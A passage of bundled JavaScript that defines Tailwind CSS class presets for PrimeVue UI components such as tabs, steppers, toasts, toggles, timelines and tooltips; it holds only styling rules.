    class: [
      // Flexbox and Position
      "inline-flex",
      "relative",
      // Shape
      "rounded-md",
      { "shadow-lg": e.raised },
      "[&>[data-pc-name=pcbutton]]:rounded-tr-none",
      "[&>[data-pc-name=pcbutton]]:rounded-br-none",
      "[&>[data-pc-name=pcdropdown]]:rounded-tl-none",
      "[&>[data-pc-name=pcdropdown]]:rounded-bl-none",
      "[&>[data-pc-name=pcmenu]]:min-w-full"
    ]
  })
}, pd = {
  root: ({ context: e }) => ({
    class: [
      // Colors
      "bg-transparent",
      "text-surface-700",
      "dark:text-surface-0/80",
      // Shape
      "rounded-md",
      // Nested
      { "flex grow border-0": e.nested }
    ]
  }),
  gutter: ({ props: e }) => ({
    class: [
      // Flexbox
      "flex",
      "items-center",
      "justify-center",
      "shrink-0",
      // Colors
      "bg-transparent",
      "dark:bg-transparent",
      // Transitions
      "transition-all",
      "duration-200",
      // Misc
      {
        "cursor-col-resize": e.layout == "horizontal",
        "cursor-row-resize": e.layout !== "horizontal"
      }
    ]
  }),
  gutterhandle: ({ props: e }) => ({
    class: [
      "z-20",
      // Colors
      "bg-surface-700",
      // Shape
      "rounded-md",
      //States
      "focus:outline-none focus:outline-offset-0 focus-visible:ring-1 focus-visible:ring-primary-400 dark:focus-visible:ring-primary-300",
      // Transitions
      "transition-all",
      "duration-200",
      "m-[1px]",
      // Sizing (Conditional)
      {
        "!w-[2px] !h-10": e.layout == "horizontal",
        "!h-[2px] !w-10": e.layout !== "horizontal"
      }
    ]
  })
}, bd = {
  root: ({ context: e }) => ({
    class: ["grow", { flex: e.nested }]
  })
}, gd = {
  root: ({ context: e }) => ({
    class: [
      "relative flex flex-auto items-center gap-2 p-2 last-of-type:flex-[initial]",
      {
        "cursor-default pointer-events-none select-none opacity-60": e.disabled
      },
      "[&_[data-pc-section=separator]]:has-[~[data-p-active=true]]:bg-secondary-400"
    ]
  }),
  header: ({ props: e, context: t }) => ({
    class: [
      "inline-flex items-center border-0 cursor-pointer rounded-md outline-transparent bg-transparent p-0 gap-2",
      "focus:outline-none focus:outline-offset-0 focus-visible:ring-1 ring-inset focus-visible:ring-secondary-400 dark:focus-visible:ring-secondary-300",
      { "!cursor-default": t.active },
      { "cursor-auto": e.linear }
    ]
  }),
  number: ({ context: e }) => ({
    class: [
      // Flexbox
      "flex",
      "items-center",
      "justify-center",
      //Colors
      "border-solid border-2 border-surface-200 dark:border-surface-700",
      // Colors (Conditional)
      e.active ? "text-secondary-400" : "text-surface-900 dark:text-surface-0",
      // Adjust colors as needed
      // Size and Shape
      "min-w-[2rem]",
      "h-[2rem]",
      "line-height-[2rem]",
      "rounded-full",
      // Text
      "text-lg",
      // Transitions
      "transition",
      "transition-colors",
      "transition-shadow",
      "duration-200"
    ]
  }),
  title: ({ context: e }) => ({
    class: [
      // Layout
      "block",
      "whitespace-nowrap",
      "overflow-hidden",
      "text-ellipsis",
      "max-w-full",
      // Text
      e.active ? "text-secondary-400" : "text-surface-700 dark:text-surface-0/80",
      "font-medium",
      // Transitions
      "transition",
      "transition-colors",
      "transition-shadow",
      "duration-200"
    ]
  })
}, hd = {
  root: ({ state: e }) => ({
    class: [
      "flex flex-col flex-[initial] has-[[data-pc-name=steppanels]]:px-2 has-[[data-pc-name=steppanels]]:pt-3.5 has-[[data-pc-name=steppanels]]:pb-[1.125rem]",
      { "flex-auto": e.isActive },
      "[&>[data-pc-name=step]]:flex-[initial]",
      "[&>[data-pc-name=steppanel]]:flex [&>[data-pc-name=steppanel]]:flex-auto [&>[data-pc-name=steppanel]>[data-pc-section=content]]:w-full [&>[data-pc-name=steppanel]>[data-pc-section=content]]:pl-4 [&:last-child>[data-pc-name=steppanel]>[data-pc-section=content]]:ps-8",
      "[&>[data-pc-name=steppanel]>[data-pc-section=separator]]:relative [&>[data-pc-name=steppanel]>[data-pc-section=separator]]:!flex-initial [&>[data-pc-name=steppanel]>[data-pc-section=separator]]:shrink-0 [&>[data-pc-name=steppanel]>[data-pc-section=separator]]:w-[2px] [&>[data-pc-name=steppanel]>[data-pc-section=separator]]:h-auto [&>[data-pc-name=steppanel]>[data-pc-section=separator]]:m-2 [&>[data-pc-name=steppanel]>[data-pc-section=separator]]:left-[-2px] [&>[data-pc-name=steppanel]>[data-pc-section=separator]]:ml-[1.625rem]"
    ]
  })
}, md = {
  root: "relative flex justify-between items-center m-0 p-0 list-none overflow-x-auto"
}, xd = {
  root: "px-2 pt-3.5 pb-[1.125rem]"
}, vd = {
  root: "has-[[data-pc-name=stepitem]]:flex has-[[data-pc-name=stepitem]]:flex-col",
  separator: "flex-1 w-full h-[2px] bg-surface-200 dark:bg-surface-700 transition-shadow duration-200",
  transition: {
    class: [
      "flex flex-1",
      "bg-surface-0 dark:bg-surface-900",
      "text-surface-900 dark:text-surface-0"
    ],
    enterFromClass: "max-h-0",
    enterActiveClass: "overflow-hidden transition-[max-height] duration-1000 ease-[cubic-bezier(0.42,0,0.58,1)]",
    enterToClass: "max-h-[1000px]",
    leaveFromClass: "max-h-[1000px]",
    leaveActiveClass: "overflow-hidden transition-[max-height] duration-[450ms] ease-[cubic-bezier(0,1,0,1)]",
    leaveToClass: "max-h-0"
  }
}, yd = {
  root: {
    class: "relative"
  },
  menu: {
    class: "p-0 m-0 list-none flex"
  },
  menuitem: {
    class: [
      // Flexbox and Position
      "relative",
      "flex",
      "justify-center",
      "flex-1",
      "overflow-hidden",
      // Before
      "before:border-t-2",
      "before:border-surface-200",
      "before:dark:border-surface-700",
      "before:w-full",
      "[&:first-child]:before:w-[calc(50%+1rem)]",
      "[&:last-child]:before:w-1/2",
      "before:absolute",
      "before:top-1/2",
      "before:left-0",
      "before:transform",
      "before:mt-[calc(-1rem+1px)]",
      "[&:first-child]:before:translate-x-[100%]"
    ]
  },
  action: ({ props: e }) => ({
    class: [
      // Flexbox
      "inline-flex items-center",
      "flex-col",
      // Transitions and Shape
      "transition-shadow",
      "rounded-md",
      // Colors
      "bg-surface-0",
      "dark:bg-transparent",
      // States
      "focus:outline-none focus:outline-offset-0 focus:ring",
      "focus:ring-primary-500 dark:focus:ring-primary-400",
      // Misc
      "overflow-hidden",
      { "cursor-pointer": !e.readonly }
    ]
  }),
  step: ({ context: e, props: t }) => ({
    class: [
      // Flexbox
      "flex items-center justify-center",
      // Position
      "z-20",
      // Shape
      "rounded-full",
      "border-2",
      // Size
      "w-8",
      "h-8",
      "text-sm",
      "leading-[2rem]",
      "font-medium",
      // Colors
      "bg-surface-0 dark:bg-surface-800",
      "border-surface-100 dark:border-surface-700",
      {
        "text-surface-400 dark:text-white/60": !e.active,
        "text-primary": e.active
      },
      // States
      {
        "hover:border-surface-300 dark:hover:border-surface-500": !e.active && !t.readonly
      },
      // Transition
      "transition-colors duration-200 ease-in-out"
    ]
  }),
  label: ({ context: e }) => ({
    class: [
      // Font
      "leading-[normal]",
      "font-medium",
      // Display
      "block",
      // Spacing
      "mt-2",
      // Colors
      {
        "text-surface-700 dark:text-white/70": !e.active,
        "text-primary": e.active
      },
      // Text and Overflow
      "whitespace-nowrap",
      "overflow-hidden",
      "overflow-ellipsis",
      "max-w-full"
    ]
  })
}, kd = {
  root: ({ props: e, context: t }) => ({
    class: [
      "relative shrink-0",
      // Shape
      "border-b",
      "rounded-t-md",
      // Spacing
      "py-4 px-[1.125rem]",
      "-mb-px",
      // Colors and Conditions
      "outline-transparent",
      {
        "border-surface-200 dark:border-secondary-400": t.active,
        "border-surface-200 dark:border-transparent": !t.active,
        "text-surface-700 dark:text-surface-0/80": !t.active,
        "bg-surface-0 dark:bg-transparent": t.active,
        "text-secondary-400": t.active,
        "opacity-60 cursor-default user-select-none select-none pointer-events-none": e == null ? void 0 : e.disabled
      },
      // States
      "focus:outline-none focus:outline-offset-0 focus-visible:ring-1 ring-inset focus-visible:ring-primary-400 dark:focus-visible:ring-secondary-400",
      // Transitions
      "transition-all duration-200",
      // Misc
      "cursor-pointer select-none whitespace-nowrap",
      "user-select-none"
    ]
  })
}, wd = {
  root: "relative flex",
  content: "overflow-x-auto overflow-y-hidden scroll-smooth overscroll-x-contain overscroll-y-auto [&::-webkit-scrollbar]:hidden grow dark:bg-surface-800",
  tabList: "relative flex border-solid border-b border-surface-200 dark:border-surface-900",
  nextButton: "!absolute top-0 right-0 z-20 h-full w-10 flex items-center justify-center text-surface-700 dark:text-surface-0/80 bg-surface-0 dark:bg-surface-800 outline-transparent cursor-pointer shrink-0",
  prevButton: "!absolute top-0 left-0 z-20 h-full w-10 flex items-center justify-center text-surface-700 dark:text-surface-0/80 bg-surface-0 dark:bg-surface-800 outline-transparent cursor-pointer shrink-0",
  activeBar: "z-10 block absolute h-[1px] bottom-[-1px] bg-primary-400"
}, _d = {
  root: {
    class: "overflow-x-auto"
  },
  menu: {
    class: [
      // Flexbox
      "flex flex-1",
      // Spacing
      "list-none",
      "p-0 m-0",
      // Colors
      "bg-surface-0 dark:bg-surface-900",
      "border-b-2 border-surface-200 dark:border-surface-700",
      "text-surface-900 dark:text-surface-0/80"
    ]
  },
  menuitem: {
    class: "mr-0"
  },
  action: ({ context: e, state: t }) => ({
    class: [
      "relative",
      // Font
      "font-semibold leading-none",
      // Flexbox and Alignment
      "flex items-center",
      // Spacing
      "py-4 px-[1.125rem]",
      "-mb-px",
      // Shape
      "border-b",
      "rounded-t-md",
      // Colors and Conditions
      {
        "border-surface-200 dark:border-surface-700": t.d_activeIndex !== e.index,
        "text-surface-700 dark:text-surface-0/80": t.d_activeIndex !== e.index,
        "bg-surface-0 dark:bg-surface-900": t.d_activeIndex === e.index,
        "border-primary": t.d_activeIndex === e.index,
        "text-primary": t.d_activeIndex === e.index
      },
      // States
      "focus:outline-none focus:outline-offset-0 focus-visible:ring-1 ring-inset focus-visible:ring-primary-400 dark:focus-visible:ring-primary-300",
      {
        "hover:text-surface-900 dark:hover:text-surface-0": t.d_activeIndex !== e.index
      },
      // Transitions
      "transition-all duration-200",
      // Misc
      "cursor-pointer select-none text-decoration-none",
      "overflow-hidden",
      "user-select-none"
    ]
  }),
  icon: {
    class: "mr-2"
  }
}, Sd = {
  root: "focus:outline-none focus:outline-offset-0 focus-visible:ring-1 ring-inset focus-visible:ring-primary-400 dark:focus-visible:ring-primary-300"
}, Cd = {
  root: "bg-surface-0 dark:bg-surface-800 text-surface-900 dark:text-surface-0/80 outline-0 p-[1.125rem] pt-[0.875rem]"
}, jd = {
  root: ({ props: e }) => ({
    class: [
      "flex flex-col",
      { "[&>[data-pc-name=tablist]]:overflow-hidden": e.scrollable }
    ]
  })
}, Td = {
  // For PrimeVue version 3
  navContainer: ({ props: e }) => ({
    class: [
      // Position
      "relative",
      // Misc
      { "overflow-hidden": e.scrollable }
    ]
  }),
  navContent: ({ instance: e }) => ({
    class: [
      // Overflow and Scrolling
      "overflow-y-hidden overscroll-contain",
      "overscroll-auto",
      "scroll-smooth",
      "[&::-webkit-scrollbar]:hidden"
    ]
  }),
  previousButton: {
    class: [
      // Flexbox and Alignment
      "flex items-center justify-center",
      // Position
      "!absolute",
      "top-0 left-0",
      "z-20",
      // Size and Shape
      "h-full w-10",
      "rounded-none",
      // Colors
      "bg-surface-0 dark:bg-surface-900",
      "text-surface-700 dark:text-surface-0/80",
      "shadow-sm"
    ]
  },
  nextButton: {
    class: [
      // Flexbox and Alignment
      "flex items-center justify-center",
      // Position
      "!absolute",
      "top-0 right-0",
      "z-20",
      // Size and Shape
      "h-full w-10",
      "rounded-none",
      // Colors
      "text-surface-700 dark:text-surface-0/80",
      "bg-surface-0 dark:bg-surface-900",
      "shadow-sm"
    ]
  },
  nav: {
    class: [
      // Flexbox
      "flex flex-1",
      // Spacing
      "list-none",
      "p-0 m-0",
      // Colors
      "bg-surface-0 dark:bg-surface-900",
      "border-b border-surface-200 dark:border-surface-700",
      "text-surface-900 dark:text-surface-0/80"
    ]
  },
  tabpanel: {
    header: ({ props: e }) => ({
      class: [
        // Spacing
        "mr-0",
        // Misc
        "outline-none",
        {
          "opacity-60 cursor-default user-select-none select-none pointer-events-none": e == null ? void 0 : e.disabled
        }
      ]
    }),
    headerAction: ({ parent: e, context: t }) => ({
      class: [
        "relative",
        // Font
        "font-semibold",
        // Flexbox and Alignment
        "flex items-center",
        // Spacing
        "py-4 px-[1.125rem]",
        "-mb-px",
        // Shape
        "border-b-2",
        "rounded-t-md",
        // Colors and Conditions
        {
          "border-surface-200 dark:border-surface-700": e.state.d_activeIndex !== t.index,
          "text-surface-700 dark:text-surface-0/80": e.state.d_activeIndex !== t.index,
          "bg-surface-0 dark:bg-surface-900": e.state.d_activeIndex === t.index,
          "border-primary": e.state.d_activeIndex === t.index,
          "text-primary": e.state.d_activeIndex === t.index
        },
        // States
        "focus:outline-none focus:outline-offset-0 focus-visible:ring-1 ring-inset focus-visible:ring-primary-400 dark:focus-visible:ring-primary-300",
        {
          "hover:bg-surface-0 dark:hover:bg-surface-800/80": e.state.d_activeIndex !== t.index,
          "hover:text-surface-900 dark:hover:text-surface-0": e.state.d_activeIndex !== t.index
        },
        // Transitions
        "transition-all duration-200",
        // Misc
        "cursor-pointer select-none text-decoration-none",
        "overflow-hidden",
        "user-select-none"
      ]
    }),
    headerTitle: {
      class: [
        // Text
        "leading-none",
        "whitespace-nowrap"
      ]
    }
  },
  panelcontainer: {
    class: [
      // Spacing
      "p-[1.125rem] pt-[0.875rem]",
      // Shape
      "border-0 rounded-none",
      "border-br-md border-bl-md",
      // Colors
      "bg-surface-0 dark:bg-surface-900",
      "text-surface-900 dark:text-surface-0/80"
    ]
  }
}, $d = {
  root: ({ props: e }) => ({
    class: [
      //Font
      "text-xs font-bold",
      //Alignments
      "inline-flex items-center justify-center",
      //Spacing
      "px-[0.4rem] py-1",
      //Shape
      {
        "rounded-md": !e.rounded,
        "rounded-full": e.rounded
      },
      //Colors
      {
        "bg-highlight": e.severity === null || e.severity === "primary",
        "text-green-700 dark:text-green-300 bg-green-100 dark:bg-green-500/20": e.severity === "success",
        "text-surface-700 dark:text-surface-300 bg-surface-100 dark:bg-surface-500/20": e.severity === "secondary",
        "text-blue-700 dark:text-blue-300 bg-blue-100 dark:bg-blue-500/20": e.severity === "info",
        "text-orange-700 dark:text-orange-300 bg-orange-100 dark:bg-orange-500/20": e.severity === "warn",
        "text-red-700 dark:text-red-300 bg-red-100 dark:bg-red-500/20": e.severity === "danger",
        "text-surface-0 dark:text-surface-900 bg-surface-900 dark:bg-surface-0": e.severity === "contrast"
      }
    ]
  }),
  value: {
    class: "leading-normal"
  },
  icon: {
    class: "mr-1 text-sm"
  }
}, Pd = {
  root: {
    class: [
      // Spacing
      "py-2 px-3",
      // Shape
      "rounded-md",
      // Color
      "bg-surface-0 dark:bg-surface-950 text-surface-700 dark:text-surface-0",
      "border border-surface-200 dark:border-surface-700",
      // Sizing & Overflow
      "h-72 overflow-auto"
    ]
  },
  container: {
    class: [
      // Flexbox
      "flex items-center"
    ]
  },
  prompt: {
    class: [
      // Color
      "text-surface-700 dark:text-surface-0"
    ]
  },
  response: {
    class: [
      // Color
      "text-surface-700 dark:text-surface-0"
    ]
  },
  command: {
    class: [
      // Color
      "text-surface-700 dark:text-surface-0"
    ]
  },
  commandtext: {
    class: [
      // Flexbox
      "flex-1 shrink grow-0",
      // Shape
      "border-0",
      // Spacing
      "p-0",
      // Color
      "bg-transparent text-inherit",
      // Outline
      "outline-none"
    ]
  }
}, Od = {
  root: ({ context: e, props: t, parent: r }) => {
    var o, s;
    return {
      class: [
        // Font
        "leading-none",
        // Spacing
        "m-0",
        "py-2 px-3",
        // Shape
        "rounded-md",
        // Colors
        "text-surface-800 dark:text-white/80",
        "placeholder:text-surface-400 dark:placeholder:text-surface-500",
        { "bg-surface-0 dark:bg-surface-950": !e.disabled },
        "border",
        { "border-surface-300 dark:border-surface-600": !t.invalid },
        // Invalid State
        "invalid:focus:ring-danger-400",
        "invalid:hover:border-danger-400",
        { "border-danger-400 dark:border-danger-400": t.invalid },
        // States
        {
          "hover:border-surface-400 dark:hover:border-surface-600": !e.disabled && !t.invalid,
          "focus:outline-none focus:outline-offset-0 focus:ring-1 focus:ring-secondary-500 dark:focus:ring-secondary-400 focus:z-10": !e.disabled,
          "bg-surface-200 dark:bg-surface-700 select-none pointer-events-none cursor-default": e.disabled
        },
        // Filled State *for FloatLabel
        {
          filled: ((o = r.instance) == null ? void 0 : o.$name) == "FloatLabel" && t.modelValue !== null && ((s = t.modelValue) == null ? void 0 : s.length) !== 0
        },
        // Misc
        "appearance-none",
        "transition-colors duration-200"
      ]
    };
  }
}, Ad = {
  root: {
    class: [
      // Shape
      "rounded-md",
      // Size
      "min-w-[12rem]",
      "p-1",
      // Colors
      "bg-surface-0 dark:bg-surface-900",
      "border border-surface-200 dark:border-surface-700"
    ]
  },
  rootList: {
    class: [
      // Spacings and Shape
      "list-none",
      "flex flex-col",
      "m-0 p-0",
      "outline-none"
    ]
  },
  item: {
    class: "relative my-[2px] [&:first-child]:mt-0"
  },
  itemContent: ({ context: e }) => ({
    class: [
      //Shape
      "rounded-[4px]",
      // Colors
      {
        "text-surface-500 dark:text-white/70": !e.focused && !e.active,
        "text-surface-500 dark:text-white/70 bg-surface-200 dark:bg-surface-600/90": e.focused && !e.active,
        "bg-highlight text-highlight-contrast": e.focused && e.active || e.active || !e.focused && e.active
      },
      // Transitions
      "transition-shadow",
      "duration-200",
      // States
      {
        "hover:bg-surface-100 dark:hover:bg-[rgba(255,255,255,0.03)]": !e.active,
        "hover:bg-highlight-emphasis": e.active
      },
      // Disabled
      { "opacity-60 pointer-events-none cursor-default": e.disabled }
    ]
  }),
  itemLink: {
    class: [
      "relative",
      // Flexbox
      "flex",
      "items-center",
      // Spacing
      "py-2",
      "px-3",
      // Misc
      "no-underline",
      "overflow-hidden",
      "cursor-pointer",
      "select-none"
    ]
  },
  itemIcon: {
    class: [
      // Spacing
      "mr-2"
    ]
  },
  itemLabel: {
    class: ["leading-none"]
  },
  submenuIcon: {
    class: [
      // Position
      "ml-auto"
    ]
  },
  submenu: {
    class: [
      // Spacing
      "flex flex-col",
      "m-0",
      "p-1",
      "list-none",
      "min-w-[12.5rem]",
      // Shape
      "shadow-none sm:shadow-md",
      "border border-surface-200 dark:border-surface-700",
      // Position
      "static sm:absolute",
      "z-10",
      // Color
      "bg-surface-0 dark:bg-surface-900"
    ]
  },
  separator: {
    class: "border-t border-surface-200 dark:border-surface-600"
  },
  transition: {
    enterFromClass: "opacity-0",
    enterActiveClass: "transition-opacity duration-250"
  }
}, Ed = {
  root: ({ props: e }) => ({
    class: [
      "flex grow",
      {
        "flex-col": e.layout === "vertical",
        "flex-row": e.layout === "horizontal"
      }
    ]
  }),
  event: ({ props: e, context: t }) => ({
    class: [
      "flex relative min-h-[70px]",
      {
        "flex-row-reverse": e.align === "right" || e.layout === "vertical" && e.align === "alternate" && t.index % 2 === 1,
        "flex-col [&:not(:last-child)]:flex-1": e.layout === "horizontal",
        "flex-col-reverse ": e.align === "bottom" || e.layout === "horizontal" && e.align === "alternate" && t.index % 2 === 1
      }
    ]
  }),
  eventOpposite: ({ props: e, context: t }) => ({
    class: [
      "flex-1",
      {
        "px-4": e.layout === "vertical",
        "py-4": e.layout === "horizontal"
      },
      {
        "text-right": e.align === "left" || e.layout === "vertical" && e.align === "alternate" && t.index % 2 === 0,
        "text-left": e.align === "right" || e.layout === "vertical" && e.align === "alternate" && t.index % 2 === 1
      }
    ]
  }),
  eventSeparator: ({ props: e }) => ({
    class: [
      "flex items-center flex-initial",
      {
        "flex-col": e.layout === "vertical",
        "flex-row": e.layout === "horizontal"
      }
    ]
  }),
  eventMarker: {
    class: [
      "relative",
      // Display & Flexbox
      "inline-flex items-center justify-center",
      // Size
      "w-[1.125rem] h-[1.125rem]",
      // Appearance
      "rounded-full border-2 border-surface-200 bg-surface-0 dark:border-surface-700 dark:bg-surface-950",
      // Before
      "before:rounded-full before:w-[0.375rem] before:h-[0.375rem] before:bg-primary",
      // After
      "after:absolute after:rounded-full after:w-full after:h-full after:shadow-sm"
    ]
  },
  eventConnector: ({ props: e }) => ({
    class: [
      "grow bg-surface-300 dark:bg-surface-700",
      {
        "w-[2px]": e.layout === "vertical",
        "w-full h-[2px]": e.layout === "horizontal"
      }
    ]
  }),
  eventContent: ({ props: e, context: t }) => ({
    class: [
      "flex-1",
      {
        "px-4": e.layout === "vertical",
        "py-4": e.layout === "horizontal"
      },
      {
        "text-left": e.align === "left" || e.layout === "vertical" && e.align === "alternate" && t.index % 2 === 0,
        "text-right": e.align === "right" || e.layout === "vertical" && e.align === "alternate" && t.index % 2 === 1
      },
      {
        "min-h-0": e.layout === "vertical" && t.index === t.count - 1,
        "grow-0": e.layout === "horizontal" && t.index === t.count - 1
      }
    ]
  })
}, Id = {
  root: ({ props: e }) => ({
    class: [
      //Size and Shape
      "w-96 rounded-md",
      // Positioning
      {
        "-translate-x-2/4": e.position == "top-center" || e.position == "bottom-center"
      }
    ]
  }),
  message: ({ props: e }) => ({
    class: [
      "mb-4 rounded-md w-full",
      "border border-transparent",
      "backdrop-blur-[10px] shadow-md",
      // Colors
      {
        "bg-blue-50/90 dark:bg-blue-500/20": e.message.severity == "info",
        "bg-green-50/90 dark:bg-green-500/20": e.message.severity == "success",
        "bg-surface-50 dark:bg-surface-800": e.message.severity == "secondary",
        "bg-orange-50/90 dark:bg-orange-500/20": e.message.severity == "warn",
        "bg-red-50/90 dark:bg-red-500/20": e.message.severity == "error",
        "bg-surface-950 dark:bg-surface-0": e.message.severity == "contrast"
      },
      {
        "border-blue-200 dark:border-blue-500/20": e.message.severity == "info",
        "border-green-200 dark:border-green-500/20": e.message.severity == "success",
        "border-surface-300 dark:border-surface-500/20": e.message.severity == "secondary",
        "border-orange-200 dark:border-orange-500/20": e.message.severity == "warn",
        "border-red-200 dark:border-red-500/20": e.message.severity == "error",
        "border-surface-950 dark:border-surface-0": e.message.severity == "contrast"
      },
      {
        "text-blue-700 dark:text-blue-300": e.message.severity == "info",
        "text-green-700 dark:text-green-300": e.message.severity == "success",
        "text-surface-700 dark:text-surface-300": e.message.severity == "secondary",
        "text-orange-700 dark:text-orange-300": e.message.severity == "warn",
        "text-red-700 dark:text-red-300": e.message.severity == "error",
        "text-surface-0 dark:text-surface-950": e.message.severity == "contrast"
      }
    ]
  }),
  messageContent: ({ props: e }) => ({
    class: [
      "flex p-3",
      {
        "items-start": e.message.summary,
        "items-center": !e.message.summary
      }
    ]
  }),
  messageIcon: ({ props: e }) => ({
    class: [
      // Sizing and Spacing
      e.message.severity === "contrast" || e.message.severity === "secondary" ? "w-0" : "w-[1.125rem] h-[1.125rem] mr-2",
      "text-lg leading-[normal]"
    ]
  }),
  messageText: {
    class: [
      // Font and Text
      "text-base leading-[normal]",
      "ml-2",
      "flex-1"
    ]
  },
  summary: {
    class: "font-medium block"
  },
  detail: ({ props: e }) => ({
    class: [
      "block",
      "text-sm",
      e.message.severity === "contrast" ? "text-surface-0 dark:text-surface-950" : "text-surface-700 dark:text-surface-0",
      { "mt-2": e.message.summary }
    ]
  }),
  closeButton: ({ props: e }) => ({
    class: [
      // Flexbox
      "flex items-center justify-center",
      // Size
      "w-7 h-7",
      // Spacing and Misc
      "ml-auto  relative",
      // Shape
      "rounded-full",
      // Colors
      "bg-transparent",
      // Transitions
      "transition duration-200 ease-in-out",
      // States
      "hover:bg-surface-0/30 dark:hover:bg-[rgba(255,255,255,0.03)]",
      "focus:outline-none focus:outline-offset-0 focus:ring-1",
      {
        "focus:ring-blue-500 dark:focus:ring-blue-400": e.severity == "info",
        "focus:ring-green-500 dark:focus:ring-green-400": e.severity == "success",
        "focus:ring-surface-500 dark:focus:ring-surface-400": e.severity == "secondary",
        "focus:ring-orange-500 dark:focus:ring-orange-400": e.severity == "warn",
        "focus:ring-red-500 dark:focus:ring-red-4000": e.severity == "error",
        "focus:ring-surface-0 dark:focus:ring-surface-950": e.severity == "contrast"
      },
      // Misc
      "overflow-hidden"
    ]
  }),
  transition: {
    enterFromClass: "opacity-0 translate-y-2/4",
    enterActiveClass: "transition-[transform,opacity] duration-300",
    leaveFromClass: "max-h-[1000px]",
    leaveActiveClass: "!transition-[max-height_.45s_cubic-bezier(0,1,0,1),opacity_.3s,margin-bottom_.3s] overflow-hidden",
    leaveToClass: "max-h-0 opacity-0 mb-0"
  }
}, zd = {
  root: ({ props: e, context: t }) => ({
    class: [
      "relative",
      // Alignment
      "flex items-center justify-center",
      "py-2 px-4",
      "rounded-md border",
      // Color
      "bg-surface-100 dark:bg-surface-950",
      {
        "text-surface-600 dark:text-white/60 before:bg-transparent": !t.active,
        "text-surface-800 dark:text-white/80 before:bg-surface-0 dark:before:bg-surface-800": t.active
      },
      // States
      {
        "hover:text-surface-800 dark:hover:text-white/80": !e.disabled && !e.modelValue,
        "focus-visible:outline-none focus-visible:ring-1 focus-visible:ring-primary-500 dark:focus-visible:ring-secondary-400": !e.disabled
      },
      // Invalid State
      {
        "border-red-500 dark:border-red-400": e.invalid,
        "border-surface-100 dark:border-surface-950": !e.invalid
      },
      // Before
      "before:absolute before:left-1 before:top-1 before:w-[calc(100%-0.5rem)] before:h-[calc(100%-0.5rem)] before:rounded-[4px] before:z-0",
      // Transitions
      "transition-all duration-200",
      // Misc
      {
        "cursor-pointer": !e.disabled,
        "opacity-60 select-none pointer-events-none cursor-default": e.disabled
      }
    ]
  }),
  content: "relative items-center inline-flex justify-center gap-2",
  label: "font-medium leading-[normal] text-center w-full z-10 relative",
  icon: "relative z-10 mr-2"
}, Zs = {
  root: ({ props: e }) => ({
    class: [
      "inline-block relative",
      "w-10 h-6",
      "rounded-2xl",
      {
        "opacity-60 select-none pointer-events-none cursor-default": e.disabled
      }
    ]
  }),
  slider: ({ props: e }) => ({
    class: [
      // Position
      "absolute top-0 left-0 right-0 bottom-0",
      {
        "before:transform before:translate-x-4": e.modelValue == e.trueValue
      },
      // Shape
      "rounded-2xl",
      // Before:
      "before:absolute before:top-1/2 before:left-1",
      "before:-mt-2",
      "before:h-4 before:w-4",
      "before:rounded-full",
      "before:duration-200",
      "before:bg-surface-0 before:dark:bg-surface-500",
      // Colors
      "border",
      {
        "bg-surface-300 dark:bg-surface-700": e.modelValue != e.trueValue,
        "bg-secondary-400": e.modelValue == e.trueValue,
        "before:dark:bg-surface-950": e.modelValue == e.trueValue,
        "border-transparent": !e.invalid
      },
      // Invalid State
      { "border-red-500 dark:border-danger-400": e.invalid },
      // States
      {
        "peer-hover:bg-surface-400 dark:peer-hover:bg-surface-600": e.modelValue != e.trueValue && !e.disabled && !e.invalid
      },
      {
        "peer-hover:bg-primary-hover": e.modelValue == e.trueValue && !e.disabled && !e.invalid
      },
      "peer-focus-visible:ring-1 peer-focus-visible:ring-primary-500 dark:peer-focus-visible:ring-secondary-200",
      // Transition
      "transition-colors duration-200",
      // Misc
      "cursor-pointer"
    ]
  }),
  input: {
    class: [
      "peer",
      // Size
      "w-full ",
      "h-full",
      // Position
      "absolute",
      "top-0 left-0",
      "z-10",
      // Spacing
      "p-0",
      "m-0",
      // Shape
      "opacity-0",
      "rounded-2xl",
      "outline-none",
      // Misc
      "appearance-none",
      "cursor-pointer"
    ]
  }
}, Rd = {
  root: {
    class: [
      // Flex & Alignment
      "flex items-center justify-between flex-wrap",
      "gap-2",
      // Spacing
      "p-3",
      // Shape
      "rounded-md",
      // Color
      "bg-surface-0 dark:bg-surface-900",
      "border border-surface-200 dark:border-surface-700"
    ]
  },
  start: {
    class: "flex items-center"
  },
  center: {
    class: "flex items-center"
  },
  end: {
    class: "flex items-center"
  }
}, Ld = {
  root: ({ context: e }) => ({
    class: [
      // Position and Shadows
      "absolute",
      "p-fadein",
      // Spacing
      {
        '[&[data-p-position="top"]]:py-1 [&[data-p-position="top"]]:px-0 py-0 px-1': (e == null ? void 0 : e.right) || (e == null ? void 0 : e.left) || !(e != null && e.right) && !(e != null && e.left) && !(e != null && e.top) && !(e != null && e.bottom),
        "py-1 px-0": (e == null ? void 0 : e.top) || (e == null ? void 0 : e.bottom)
      },
      // Flipped Tooltip Arrow
      '[&[data-p-position="top"]>[data-pc-section=arrow]]:border-x-[10px] [&[data-p-position="top"]>[data-pc-section=arrow]]:border-t-[10px] [&[data-p-position="top"]>[data-pc-section=arrow]]:border-b-0 [&[data-p-position="top"]>[data-pc-section=arrow]]:border-t-surface-700 [&[data-p-position="top"]>[data-pc-section=arrow]]:border-y-0 [&[data-p-position="top"]>[data-pc-section=arrow]]:border-x-transparent',
      '[&[data-p-position="top"]>[data-pc-section=arrow]]:-ml-[10px] [&[data-p-position="top"]>[data-pc-section=arrow]]:left-1/2 [&[data-p-position="top"]>[data-pc-section=arrow]]:mt-auto [&[data-p-position="top"]>[data-pc-section=arrow]]:top-auto'
    ]
  }),
  arrow: ({ context: e }) => ({
    class: [
      // Position
      "absolute",
      // Size
      "w-0",
      "h-0",
      // Shape
      "border-transparent",
      "border-solid",
      {
        "border-y-[10px] border-r-[10px] border-l-0 border-r-surface-700": (e == null ? void 0 : e.right) || !(e != null && e.right) && !(e != null && e.left) && !(e != null && e.top) && !(e != null && e.bottom),
        "border-y-[10px] border-l-[10px] border-r-0 border-l-surface-700": e == null ? void 0 : e.left,
        "border-x-[10px] border-t-[10px] border-b-0 border-t-surface-700 ": e == null ? void 0 : e.top,
        "border-x-[10px] border-b-[10px] border-t-0 border-b-surface-700": e == null ? void 0 : e.bottom
      },
      // Spacing
      {
        "-mt-[10px] top-1/2": (e == null ? void 0 : e.right) || (e == null ? void 0 : e.left) || !(e != null && e.right) && !(e != null && e.left) && !(e != null && e.top) && !(e != null && e.bottom),
        "-ml-[10px] left-1/2": (e == null ? void 0 : e.top) || (e == null ? void 0 : e.bottom)
      }
    ]
  }),
  text: {
    class: [
